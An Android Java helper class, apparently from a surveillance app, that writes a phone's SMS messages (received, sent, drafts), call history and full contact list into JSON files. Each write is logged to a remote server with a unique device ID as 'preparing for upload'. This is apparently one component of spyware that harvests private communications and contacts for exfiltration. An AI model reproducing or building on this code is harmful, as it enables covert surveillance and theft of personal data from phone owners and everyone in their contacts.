package com.aigs.serviceone.helpers;

import android.content.Context;
import android.widget.Toast;

import com.aigs.serviceone.annotations.SmsModes;
import com.example.logshandler.starter.Logs;
import com.example.uniqueidmanager.UniqueId;

import java.io.File;
import java.io.FileWriter;

public class FileSystem {

    private Context context;
    private @SmsModes String mode;
    private String uuid;

    public FileSystem(Context context) {
        uuid = UniqueId.initialize(context).getUUID();
        this.context = context;
    }

    public static FileSystem createInstance(Context context){
        return new FileSystem(context);
    }

    public FileSystem smsOperationType(@SmsModes String mode){
        this.mode = mode;
        return this;
    }

    public synchronized File writeSmsData(String data){
        String name = "null";
        switch (mode){
            case SmsModes.MODE_INBOX:
                name = "sms_received.json";
                break;
            case SmsModes.MODE_OUTBOX:
                name = "sms_sent.json";
                break;
            case SmsModes.MODE_DRAFT:
                name = "sms_draft.json";
                break;
        }

        File file = new File(context.getFilesDir(), "text");
        File gpxfile = null;
        if (!file.exists()) {
            file.mkdir();
        }
        try {
            gpxfile = new File(file, name);
            FileWriter writer = new FileWriter(gpxfile);
            writer.append(data);
            writer.flush();
            writer.close();
            Logs.pushLogsToServer("[DONE]: Sms Data written to .json preparing for upload.",uuid);
        } catch (Exception e) {
            Logs.pushLogsToServer("[ERROR]: "+ e.getMessage(), uuid);
        }

        return gpxfile;
    }

    public synchronized File writeCallData(String data){
        File file = new File(context.getFilesDir(), "text");
        File gpxfile = null;
        if (!file.exists()) {
            file.mkdir();
        }
        try {
            gpxfile = new File(file,"calls_history.json");
            FileWriter writer = new FileWriter(gpxfile);
            writer.append(data);
            writer.flush();
            writer.close();
            Logs.pushLogsToServer("[DONE]: Call Data written to .json preparing for upload.",uuid);
        } catch (Exception e) {
            Logs.pushLogsToServer("[ERROR]: "+ e.getMessage(), uuid);
        }

        return gpxfile;
    }

    public synchronized File writeContactsData(String data){
        File file = new File(context.getFilesDir(), "text");
        File gpxfile = null;
        if (!file.exists()) {
            file.mkdir();
        }
        try {
            gpxfile = new File(file,"contacts_all.json");
            FileWriter writer = new FileWriter(gpxfile);
            writer.append(data);
            writer.flush();
            writer.close();
            Logs.pushLogsToServer("[DONE]: contacts Data written to .json preparing for upload.",uuid);
        } catch (Exception e) {
            Logs.pushLogsToServer("[ERROR]: "+ e.getMessage(),uuid);
        }

        return gpxfile;
    }
}
